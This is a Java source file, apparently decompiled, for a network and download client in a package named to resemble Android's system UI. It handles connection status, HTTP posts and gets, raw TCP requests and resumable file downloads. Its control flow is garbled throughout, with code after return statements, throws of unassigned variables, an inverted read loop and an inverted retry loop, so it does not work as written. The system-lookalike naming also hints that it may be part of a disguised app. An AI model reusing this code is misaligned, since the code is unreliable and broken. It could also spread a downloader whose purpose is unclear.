package com.android.systemui.assis.modules;

import android.content.Context;
import com.android.systemui.assis.app.LOG;
import com.android.systemui.assis.app.SystemEnvironment;
import com.android.systemui.assis.core.IStatistics;
import com.android.systemui.assis.core.ITaskListener;
import com.android.systemui.assis.modules.INetClient.DownloadRequest;
import com.android.systemui.assis.modules.INetClient.NET_TYPE;
import com.android.systemui.assis.modules.INetClient.Server;
import com.android.systemui.assis.modules.NetworkManager.INetworkStatusListener;
import com.android.systemui.assis.modules.NetworkManager.NET_STAT;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.RandomAccessFile;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class NetClient implements INetClient {
    private static final String TAG = "NetClient";
    private boolean isGprsConn = false;
    private boolean isWifiConn = false;
    private Context mAppletContext = null;
    private boolean mIsConnected = false;
    private NET_TYPE mNetType = NET_TYPE.NET_TYPE_INVALID;
    private NetworkManager mNetworkManager = null;
    private IStatistics mShell = null;

    private class DownloadTask implements Runnable {
        private static final int DEFAULT_CONNECT_TIMEOUT = 10000;
        private static final int DEFAULT_READ_TIMEOUT = 20000;
        private static final int DEFAULT_RETRY_COUNT = 3;
        private static final String TAG = "DownloadTask";
        private static final String TEMP_FILE_SUFFIX = ".temp";
        private DownloadRequest mDataInfo = null;
        private long mDownloadedSize = 0;
        private ITaskListener mListener = null;
        private String mTargetObjectFilePath = null;
        private long mTargetObjectSize = 0;
        private String mTargetObjectTempFilePath = null;
        private URL mTargetUrl = null;

        public DownloadTask(DownloadRequest dataInfo, ITaskListener listener) throws Exception {
            if (listener != null) {
                this.mDataInfo = dataInfo;
                this.mListener = listener;
                return;
            }
            throw new Exception("Listener must not be null");
        }

        public void run() {
            RandomAccessFile randomAccessFile;
            Exception e;
            MalformedURLException e2;
            Throwable th;
            int retryCount = 0;
            int preCheckResult = doPreCheck();
            long startPos = 0;
            InputStream in = null;
            HttpURLConnection conn = null;
            RandomAccessFile randomAccessFile2 = null;
            int progress = 0;
            LOG.E(TAG, "precheck result : " + preCheckResult);
            if (preCheckResult == 0) {
                this.mListener.onPreExecute(0, Integer.valueOf(this.mDataInfo.notifyId));
                int result = 7;
                do {
                    try {
                        byte[] buf;
                        int numread;
                        int lastProgress;
                        int notifyId = this.mDataInfo.notifyId;
                        File tempFile = new File(this.mTargetObjectTempFilePath);
                        if (!tempFile.getParentFile().exists()) {
                            tempFile.getParentFile().mkdir();
                        }
                        conn = (HttpURLConnection) this.mTargetUrl.openConnection();
                        conn.setConnectTimeout(DEFAULT_CONNECT_TIMEOUT);
                        conn.setReadTimeout(20000);
                        if (tempFile.exists()) {
                            startPos = tempFile.length();
                            if ((startPos < this.mTargetObjectSize ? 1 : null) == null) {
                                tempFile.delete();
                                startPos = 0;
                            } else {
                                conn.setRequestProperty("Range", "bytes=" + tempFile.length() + "-" + this.mTargetObjectSize);
                            }
                        }
                        in = conn.getInputStream();
                        if (conn.getResponseCode() != 206) {
                            if ((startPos <= 0 ? 1 : null) == null) {
                                result = 7;
                                randomAccessFile = new RandomAccessFile(this.mTargetObjectTempFilePath, "rwd");
                                randomAccessFile.seek(startPos);
                                buf = new byte[10240];
                                this.mDownloadedSize = startPos;
                                while (true) {
                                    numread = in.read(buf);
                                    if (numread != -1) {
                                        break;
                                    }
                                    randomAccessFile.write(buf, 0, numread);
                                    this.mDownloadedSize += (long) numread;
                                    if (numread > 0) {
                                        lastProgress = progress;
                                        progress = (int) ((this.mDownloadedSize * 100) / this.mTargetObjectSize);
                                        if (progress > lastProgress) {
                                            this.mListener.onUpdate(notifyId, Integer.valueOf(progress));
                                        }
                                    }
                                }
                                if (tempFile.length() == this.mTargetObjectSize) {
                                    tempFile.delete();
                                    result = 7;
                                    randomAccessFile2 = randomAccessFile;
                                } else {
                                    randomAccessFile.close();
                                    randomAccessFile2 = null;
                                    tempFile.renameTo(new File(this.mTargetObjectFilePath));
                                    result = 0;
                                }
                                if (conn != null) {
                                    try {
                                        conn.disconnect();
                                    } catch (Exception e3) {
                                        e3.printStackTrace();
                                    }
                                }
                                if (randomAccessFile2 != null) {
                                    randomAccessFile2.close();
                                }
                                if (in != null) {
                                    try {
                                        in.close();
                                    } catch (IOException e4) {
                                        e4.printStackTrace();
                                    }
                                }
                                this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                                return;
                            }
                        }
                        if (conn.getResponseCode() == 404) {
                            result = 1;
                        }
                        randomAccessFile = new RandomAccessFile(this.mTargetObjectTempFilePath, "rwd");
                        try {
                            randomAccessFile.seek(startPos);
                            buf = new byte[10240];
                            this.mDownloadedSize = startPos;
                            while (true) {
                                numread = in.read(buf);
                                if (numread != -1) {
                                    break;
                                }
                                randomAccessFile.write(buf, 0, numread);
                                this.mDownloadedSize += (long) numread;
                                if (numread > 0) {
                                    lastProgress = progress;
                                    progress = (int) ((this.mDownloadedSize * 100) / this.mTargetObjectSize);
                                    if (progress > lastProgress) {
                                        this.mListener.onUpdate(notifyId, Integer.valueOf(progress));
                                    }
                                }
                            }
                            if (tempFile.length() == this.mTargetObjectSize) {
                                randomAccessFile.close();
                                randomAccessFile2 = null;
                                tempFile.renameTo(new File(this.mTargetObjectFilePath));
                                result = 0;
                            } else {
                                tempFile.delete();
                                result = 7;
                                randomAccessFile2 = randomAccessFile;
                            }
                            if (conn != null) {
                                conn.disconnect();
                            }
                            if (randomAccessFile2 != null) {
                                randomAccessFile2.close();
                            }
                            if (in != null) {
                                in.close();
                            }
                        } catch (MalformedURLException e5) {
                            e2 = e5;
                            randomAccessFile2 = randomAccessFile;
                            e2.printStackTrace();
                            result = 1;
                            if (conn != null) {
                                try {
                                    conn.disconnect();
                                    conn = null;
                                } catch (Exception e32) {
                                    e32.printStackTrace();
                                }
                            }
                            if (randomAccessFile2 != null) {
                                try {
                                    randomAccessFile2.close();
                                } catch (IOException e42) {
                                    e42.printStackTrace();
                                }
                            }
                            if (in != null) {
                                in.close();
                            }
                            if (retryCount >= 3) {
                                this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                                return;
                            }
                        } catch (Exception e6) {
                            e32 = e6;
                            randomAccessFile2 = randomAccessFile;
                            e32.printStackTrace();
                            if (retryCount < 3) {
                                retryCount++;
                                try {
                                    Thread.sleep(2000);
                                } catch (InterruptedException e1) {
                                    e1.printStackTrace();
                                } catch (Throwable th2) {
                                    th = th2;
                                }
                                if (conn != null) {
                                    try {
                                        conn.disconnect();
                                        conn = null;
                                    } catch (Exception e322) {
                                        e322.printStackTrace();
                                    }
                                }
                                if (randomAccessFile2 != null) {
                                    randomAccessFile2.close();
                                }
                                if (in != null) {
                                    try {
                                        in.close();
                                    } catch (IOException e422) {
                                        e422.printStackTrace();
                                    }
                                }
                            } else {
                                if (conn != null) {
                                    try {
                                        conn.disconnect();
                                        conn = null;
                                    } catch (Exception e3222) {
                                        e3222.printStackTrace();
                                    }
                                }
                                if (randomAccessFile2 != null) {
                                    randomAccessFile2.close();
                                }
                                if (in != null) {
                                    try {
                                        in.close();
                                    } catch (IOException e4222) {
                                        e4222.printStackTrace();
                                    }
                                }
                            }
                            if (retryCount >= 3) {
                                this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                                return;
                            }
                        } catch (Throwable th3) {
                            th = th3;
                            randomAccessFile2 = randomAccessFile;
                        }
                    } catch (MalformedURLException e7) {
                        e2 = e7;
                    } catch (Exception e8) {
                        e3222 = e8;
                        e3222.printStackTrace();
                        if (retryCount < 3) {
                            if (conn != null) {
                                conn.disconnect();
                                conn = null;
                            }
                            if (randomAccessFile2 != null) {
                                randomAccessFile2.close();
                            }
                            if (in != null) {
                                in.close();
                            }
                        } else {
                            retryCount++;
                            Thread.sleep(2000);
                            if (conn != null) {
                                conn.disconnect();
                                conn = null;
                            }
                            if (randomAccessFile2 != null) {
                                randomAccessFile2.close();
                            }
                            if (in != null) {
                                in.close();
                            }
                        }
                        if (retryCount >= 3) {
                            this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                            return;
                        }
                    }
                    this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                    return;
                } while (retryCount >= 3);
                this.mListener.onExecuted(result, Integer.valueOf(this.mDataInfo.notifyId));
                return;
            }
            this.mListener.onPreExecute(preCheckResult, Integer.valueOf(this.mDataInfo.notifyId));
            return;
            if (conn != null) {
                try {
                    conn.disconnect();
                } catch (Exception e32222) {
                    e32222.printStackTrace();
                }
            }
            if (randomAccessFile2 != null) {
                try {
                    randomAccessFile2.close();
                } catch (IOException e42222) {
                    e42222.printStackTrace();
                }
            }
            if (in != null) {
                in.close();
            }
            throw th;
            if (randomAccessFile2 != null) {
                randomAccessFile2.close();
            }
            if (in != null) {
                in.close();
            }
            throw th;
            throw th;
        }

        private int doPreCheck() {
            LOG.I(TAG, "download task doPreCheck target object");
            if (this.mDataInfo == null) {
                return 6;
            }
            try {
                this.mTargetUrl = new URL(this.mDataInfo.url);
                this.mTargetObjectSize = this.mDataInfo.targetSize;
                LOG.I(TAG, "target size [" + this.mTargetObjectSize + "]");
                if ((SystemEnvironment.getSDFreeSize() >= this.mTargetObjectSize * 2 ? 1 : null) == null) {
                    if ((SystemEnvironment.getSystemFreeSize() >= this.mTargetObjectSize ? 1 : null) == null) {
                        if ((SystemEnvironment.getSDFreeSize() >= this.mTargetObjectSize ? 1 : null) == null) {
                            return 2;
                        }
                    }
                }
                this.mTargetObjectFilePath = new StringBuilder(String.valueOf(this.mDataInfo.localPath)).append(this.mDataInfo.fileName).toString();
                LOG.I(TAG, "target file path" + this.mTargetObjectFilePath);
                if (this.mTargetObjectFilePath == null || this.mTargetObjectFilePath.equals("") || this.mTargetObjectFilePath.endsWith("/")) {
                    return 3;
                }
                this.mTargetObjectTempFilePath = this.mTargetObjectFilePath + TEMP_FILE_SUFFIX;
                File folderChecker = new File(this.mTargetObjectFilePath.substring(0, this.mTargetObjectFilePath.lastIndexOf("/")));
                if (!(folderChecker.exists() && folderChecker.isDirectory())) {
                    return 5;
                }
                return 0;
            } catch (NumberFormatException e) {
                return 4;
            } catch (MalformedURLException e2) {
                return 1;
            } catch (Exception e3) {
                e3.printStackTrace();
            }
        }
    }

    public void onCreate(IStatistics shell) {
        this.mShell = shell;
        this.mAppletContext = shell.getAppletContext();
        this.mNetworkManager = new NetworkManager(this.mAppletContext);
        this.mNetworkManager.init(3, 20000, true);
        this.mNetworkManager.setListener(new INetworkStatusListener() {
            private static /* synthetic */ int[] $SWITCH_TABLE$com$android$systemui$assis$modules$NetworkManager$NET_STAT;

            static /* synthetic */ int[] $SWITCH_TABLE$com$android$systemui$assis$modules$NetworkManager$NET_STAT() {
                int[] iArr = $SWITCH_TABLE$com$android$systemui$assis$modules$NetworkManager$NET_STAT;
                if (iArr != null) {
                    return iArr;
                }
                iArr = new int[NET_STAT.values().length];
                try {
                    iArr[NET_STAT.NET_GPRS_CONN.ordinal()] = 2;
                } catch (NoSuchFieldError e) {
                }
                try {
                    iArr[NET_STAT.NET_GPRS_LOST.ordinal()] = 1;
                } catch (NoSuchFieldError e2) {
                }
                try {
                    iArr[NET_STAT.NET_WIFI_CONN.ordinal()] = 4;
                } catch (NoSuchFieldError e3) {
                }
                try {
                    iArr[NET_STAT.NET_WIFI_LOST.ordinal()] = 3;
                } catch (NoSuchFieldError e4) {
                }
                $SWITCH_TABLE$com$android$systemui$assis$modules$NetworkManager$NET_STAT = iArr;
                return iArr;
            }

            public void onStatusChange(NET_STAT status) {
                switch (AnonymousClass1.$SWITCH_TABLE$com$android$systemui$assis$modules$NetworkManager$NET_STAT()[status.ordinal()]) {
                    case 1:
                        LOG.E(NetClient.TAG, "GPRS is lost!");
                        NetClient.this.mShell.sendEmptyMessage(7);
                        NetClient.this.isGprsConn = false;
                        break;
                    case 2:
                        LOG.I(NetClient.TAG, "GPRS is connected");
                        NetClient.this.mShell.sendEmptyMessage(5);
                        NetClient.this.isGprsConn = true;
                        break;
                    case 3:
                        LOG.E(NetClient.TAG, "Wifi is lost!");
                        NetClient.this.mShell.sendEmptyMessage(6);
                        NetClient.this.isWifiConn = false;
                        break;
                    case 4:
                        LOG.I(NetClient.TAG, "Wifi is connected");
                        NetClient.this.mShell.sendEmptyMessage(4);
                        NetClient.this.isWifiConn = true;
                        break;
                }
                NetClient.this.mIsConnected = NetClient.this.isGprsConn | NetClient.this.isWifiConn;
                NetClient netClient = NetClient.this;
                NET_TYPE net_type = !NetClient.this.isWifiConn ? !NetClient.this.isGprsConn ? NET_TYPE.NET_TYPE_INVALID : NET_TYPE.NET_TYPE_GPRS : NET_TYPE.NET_TYPE_WIFI;
                netClient.mNetType = net_type;
            }
        });
    }

    public void onDestroy() {
        this.mNetworkManager.deInit();
    }

    public NET_TYPE getCurrentNetType() {
        return this.mNetType;
    }

    public String getCurrentNetTypeName() {
        if (this.mNetType == NET_TYPE.NET_TYPE_GPRS) {
            return "GPRS";
        }
        if (this.mNetType != NET_TYPE.NET_TYPE_WIFI) {
            return "";
        }
        return "WIFI";
    }

    public boolean isNetActivated() {
        return this.mIsConnected;
    }

    public String postDataToServer(String uri, String data) {
        return this.mNetworkManager.doHttpPost(uri, data);
    }

    public String pullDataFromServer(String uri) {
        return this.mNetworkManager.doHttpGet(uri);
    }

    public String tcpRequest(Server server, String requestData) {
        return this.mNetworkManager.doTcpRequest(server.mAddress, server.mPort, requestData);
    }

    public long getCurrentTraffic() {
        return this.mNetworkManager.getUsedGprsTraffic();
    }

    public void downloadObject(DownloadRequest request, ITaskListener listener) {
        try {
            this.mShell.submitTask(new DownloadTask(request, listener));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
